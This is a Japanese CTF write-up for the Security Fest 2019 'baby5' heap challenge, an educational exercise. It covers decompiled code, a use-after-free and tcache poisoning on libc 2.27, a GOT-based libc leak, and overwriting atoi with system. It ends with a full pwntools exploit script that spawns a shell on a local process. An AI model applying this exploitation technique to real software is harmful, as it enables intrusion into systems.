---
tags: pwn
---


# Security Fest 2019 - Baby5

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## Writeup

### outline

add(create+edit), edit, delete, showが出来るいつものHeap問、libc-2.27なのでtcache poisoningが出来そう。
グローバル変数にこれまでにaddして確保されたチャンクを指すポインタの配列があって、対象のポインタをインデックスで指定することで操作を行う。
脆弱性としてDouble FreeもUAFも出来るのでそれを利用してこの配列の中身を書き換えてしまえば、任意アドレスに対してedit, delete, showが出来る。
というわけで適当にこの配列の自分がわかるところに何らかのGOTを持ってきてshowすることでlibc leakし、あとはGOT OverwriteでOne Gadgetを刺すなり`atoi`を`system`に書き換えて選択肢で`"/bin/sh"`を刺すなりすれば良い、私は後者を使った。

### Binary

いつもの
```bash
$ checksec baby5
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Partial RELROなのでGOT Overwriteが出来る、PIE無効なのでGOTのアドレスもグローバル変数のアドレスも配置場所を特定するまでもなく利用できる。

Ghidraでmain関数をデコンパイルし、変数や関数名を調整した結果がこちら

```clike
void main(void)

{
  undefined4 uVar1;
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  signal(0xe,_exit);
  greeting();
switchD_00400dce_caseD_5:
  uVar1 = select();
  switch(uVar1) {
  case 0:
    _exit();
    goto switchD_00400dce_caseD_5;
  case 1:
    _add();
    goto switchD_00400dce_caseD_5;
  case 2:
    _edit();
    goto switchD_00400dce_caseD_5;
  case 3:
    _delete();
    goto switchD_00400dce_caseD_5;
  case 4:
    _show();
  default:
    goto switchD_00400dce_caseD_5;
  }
}

```
いつものelse if連打と違ってswtich文は読みやすくて助かる。

`select`は入力を`atoi`で数値に変換している。

```clike
void select(void)

{
  ssize_t sVar1;
  long in_FS_OFFSET;
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("\x1b[1;1mobligatory heap menu:\x1b[0m\n");
  puts("   \x1b[1;1m1.\x1b[0m add       \x1b[1;1m2.\x1b[0m edit");
  puts("   \x1b[1;1m3.\x1b[0m delete    \x1b[1;1m4.\x1b[0m show");
  puts("   \x1b[1;1m0.\x1b[0m exit");
  printf("> ");
  sVar1 = read(0,local_28,0x10);
  if (sVar1 < 1) {
                    /* WARNING: Subroutine does not return */
    _exit(1);
  }
  puts("");
  atoi(local_28);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

`_add`のデコンパイル結果はこちら
```clike
void _add(void)

{
  int iVar1;
  void *ptr;
  ssize_t sVar2;
  uint ptr_cnt;
  size_t size;
  
  size = 0;
  ptr_cnt = 0;
  while ((ptr_cnt < 0x400 && (*(long *)(&ptr_list + (ulong)ptr_cnt * 8) != 0))) {
    ptr_cnt = ptr_cnt + 1;
  }
  if (ptr_cnt == 0x400) {
    error("out of space");
  }
  else {
    printf("size: ");
    iVar1 = __isoc99_scanf("%llu%*c",&size);
    if (iVar1 == 0) {
      error("invalid");
    }
    else {
      ptr = malloc(size);
      *(void **)(&ptr_list + (ulong)ptr_cnt * 8) = ptr;
      if (*(long *)(&ptr_list + (ulong)ptr_cnt * 8) == 0) {
        error("you broke it");
      }
      else {
        printf("data: ");
        sVar2 = read(0,*(void **)(&ptr_list + (ulong)ptr_cnt * 8),(long)(int)size);
        if (sVar2 < 1) {
          error("no data");
        }
        else {
          msg("created item");
        }
      }
    }
  }
  return;
}
```
`ptr_list`はグローバル変数で確保した領域を指すポインタの配列となっている。
`_add`では0になっている(つまりヌルポインタ)インデックスを探してそこに確保したポインタを入れている。
`_edit`, `_delete`, `_show`に関してはインデックスを指定し、そこに入ってるポインタに対してそれぞれの動作を行ういつものパターンなのでデコンパイル結果は省略する。

### libc leak

UAFがあるので一旦addしてdeleteしたチャンクに対してeditを行って次の次に確保されるチャンクを任意アドレスに設定できる。下の図は最初に確保したチャンクのアドレスを`a`とし、UAFで`a`に`p`を書き込んだ時の様子。

```
~~ ptr_list ~~
0: a (*a = p)
~~ tcache ~~
a -> p -> ???
```

ここでaddを1回行い`v`を書き込むと次のようになる

```
~~ ptr_list ~~
0: a (*a = v)
1: a (*a = v)
~~ tcache ~~
p -> ???
```

この状態でもう一度addを行い、`_p`を書き込む、すると`*p = _p`となり、いつものように任意アドレスに対して任意値の書き込みが出来る。
```
~~ ptr_list ~~
0: a (*a = v)
1: a (*a = v)
2: p (*p = _p)
~~ tcache ~~
???
```

さてここで`p`を`ptr_list`の先端(具体的には`0x6020c0`), `_p`をアドレス解決済のGOTにしてみると次のようになる

```
~~ ptr_list ~~
0: func@got (*func@got = func_addr)
1: a (*a = v)
2: p (*p = _p)
```

ということでインデックス0で管理されている箇所が`func@got`になった、これをshowしてlibc中の`func`の位置を引けばlibc leak出来る。

### get a shell

今回は`func`として`atoi`を利用したがこれには理由があって、このままeditでGOT Overwriteが出来るからである。
GOT Overwriteで`atoi`が呼ばれた際に`system`の配置場所へ飛ぶようにすると選択肢の入力がそのまま`system`の引数になるので`system("/bin/sh")`が呼ばれてシェルが取れる。
もちろんOne GadgetでOverwriteしても良い(確認してないけど)。

## Code

```python
from pwn import process, p64, u64, ELF


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, size, data=b"junk"):
    _select(s, b"1")
    print("[+] add")
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.sendline(data)


def edit(s, idx, size, data):
    _select(s, b"2")
    print("[+] edit")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("size: ")
    s.sendline(str(size).encode())
    s.recvuntil("data: ")
    s.sendline(data)


def delete(s, idx):
    _select(s, b"3")
    print("[+] delete")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())


def show(s, idx):
    _select(s, b"4")
    print("[+] show")
    s.recvuntil("item: ")
    s.sendline(str(idx).encode())
    s.recvuntil("data: ")
    return s.recvline().rstrip()


if __name__ == '__main__':
    elf = ELF("./baby5")
    libc = ELF("./libc.so.6")  # 2.27

    atoi_got = elf.got["atoi"]
    ptr_list = 0x6020c0

    atoi_libc = libc.symbols["atoi"]
    system_libc = libc.symbols["system"]

    s = process("./baby5")

    idx = 0
    add(s, 0x20)
    delete(s, idx)
    edit(s, 0, 0x20, p64(ptr_list))
    add(s, 0x20)
    add(s, 0x20, p64(atoi_got))
    libcbase = u64(show(s, 0).ljust(8, b"\x00")) - atoi_libc
    print(hex(libcbase))

    system_addr = libcbase + system_libc
    edit(s, 0, 0x20, p64(system_addr))
    _select(s, b"/bin/sh")

    s.interactive()

```

## Flag

ローカルでシェル取っただけなので無いです

## 公式Writeup?

CTFtimeにSecurity Festを名乗るチームが上げていたので掲載、ただアホみたいに複雑なことをやっている(上によく理解できていない)

https://gist.github.com/0xb0bb/9ce7925e1a3342d243d907a95d48bdca

## 感想

解いた後に各方面のwriteup読んだらunsorted binを利用してmain_arena経由のlibc leakをしていたのでそっちも調べておきます